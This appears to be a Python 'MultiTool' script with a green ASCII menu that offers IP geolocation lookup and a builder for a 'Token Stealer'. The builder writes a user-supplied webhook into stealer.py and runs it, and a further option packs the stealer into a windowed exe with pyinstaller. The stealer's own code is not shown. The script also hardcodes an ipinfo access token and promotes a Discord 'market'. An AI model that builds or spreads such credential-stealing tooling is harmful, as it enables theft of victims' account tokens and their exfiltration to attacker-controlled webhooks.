import os
import sys
import time
import webbrowser
import ipinfo
from colorama import Fore, init

init()
os.system('title github.com/unkelr')


def cls():
    os.system('cls')

def intro():
    print(Fore.GREEN + f"""

 █    ██  ███▄    █  ██ ▄█▀▓█████  ██▓    
 ██  ▓██▒ ██ ▀█   █  ██▄█▒ ▓█   ▀ ▓██▒    
▓██  ▒██░▓██  ▀█ ██▒▓███▄░ ▒███   ▒██░    
▓▓█  ░██░▓██▒  ▐▌██▒▓██ █▄ ▒▓█  ▄ ▒██░    
▒▒█████▓ ▒██░   ▓██░▒██▒ █▄░▒████▒░██████▒
░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░▓  ░
░░▒░ ░ ░ ░ ░░   ░ ▒░░ ░▒ ▒░ ░ ░  ░░ ░ ▒  ░
 ░░░ ░ ░    ░   ░ ░ ░ ░░ ░    ░     ░ ░   
   ░              ░ ░  ░      ░  ░    ░  ░

          Unkel MultiTool

""")
    
intro()
time.sleep(3)
cls()

def main_menu():
    print(Fore.GREEN + f"""

███╗   ███╗██╗   ██╗██╗  ████████╗██╗              ████████╗ ██████╗  ██████╗ ██╗     
████╗ ████║██║   ██║██║  ╚══██╔══╝██║              ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██╔████╔██║██║   ██║██║     ██║   ██║    █████╗       ██║   ██║   ██║██║   ██║██║     
██║╚██╔╝██║██║   ██║██║     ██║   ██║    ╚════╝       ██║   ██║   ██║██║   ██║██║     
██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║                 ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝                 ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝


                    1. INFO                           4. Compile Stealer to exe
          
                    2. IP Lookup                      5. Github

                    3. Token Stealer                  6. Exit

""")


while True:
    def compile_to_exe():
        if os.path.exists("stealer.py"):
            os.system("pyinstaller --onefile --windowed stealer.py")
            print("Compilation completed successfully!")
        else:
            print("Error: File 'stealer.py' not found.")

    def iplookup():
        access_token = 'cb657df67f619c'
        handler = ipinfo.getHandler(access_token)

        choice = input(f"       {Fore.GREEN}[{Fore.LIGHTGREEN_EX}→{Fore.GREEN}]{Fore.LIGHTGREEN_EX}  {Fore.GREEN}")

        if choice == "1":
            webbrowser.open("https://discord.gg/unkelmarket")

        elif choice == "4":
            compile_to_exe()

        elif choice == "3":
            webhook = input(f"       {Fore.GREEN}[{Fore.LIGHTGREEN_EX}WEBHOOK →{Fore.GREEN}]{Fore.LIGHTGREEN_EX}{Fore.GREEN} ")

            filename = "stealer.py"
            filepath = os.path.join(os.getcwd(), filename)
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
            new_content = content.replace('WEBHOOK-URL', f'{webhook}')
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(new_content)
            print("              Now compile it!")
            os.system("python stealer.py")
            time.sleep(2)
            cls()
            
        elif choice == "2":
            ip_address = input(f"       {Fore.GREEN}[{Fore.LIGHTGREEN_EX}IP{Fore.GREEN}]{Fore.LIGHTGREEN_EX}{Fore.GREEN} ")
            details = handler.getDetails(ip_address)
            print(f"        IP: {details.ip}")
            print(f"        City: {details.city}")
            print(f"        Region: {details.region}")
            print(f"        Country: {details.country}")
            print(f"        Organization: {details.org}")
            print(f"        Latitude: {details.latitude}")
            print(f"        Longitude: {details.longitude}")
            time.sleep(5)

        elif choice == "5":
            webbrowser.open("https://github.com/unkelr")

        elif choice == "6":
            print(Fore.GREEN + f"         Exiting")
            time.sleep(1)
            sys.exit(0)

    main_menu()
    iplookup()
